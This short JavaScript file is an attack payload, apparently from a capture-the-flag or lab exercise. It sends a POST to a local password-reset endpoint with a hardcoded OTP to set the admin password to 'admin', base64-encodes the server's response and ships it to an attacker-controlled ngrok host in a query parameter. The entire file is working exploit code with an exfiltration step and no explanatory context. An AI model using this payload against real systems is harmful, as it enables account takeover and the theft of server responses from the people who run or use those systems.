var http = new XMLHttpRequest();
var url = 'http://localhost:8000/reset_password';
var data = JSON.stringify({
    'password': 'admin',
    'password2': 'admin',
    'otp': '1337',

});
http.open('POST', url, true);


http.onload = function() {
    var rce = btoa(http.responseText);
    var exfil = new XMLHttpRequest();
    exfil.open("GET", "http://<ngrok ip>.ngrok.io?rce=" + rce);
    exfil.send();

};


http.setRequestHeader('Content-type', 'application/json');


http.send(data);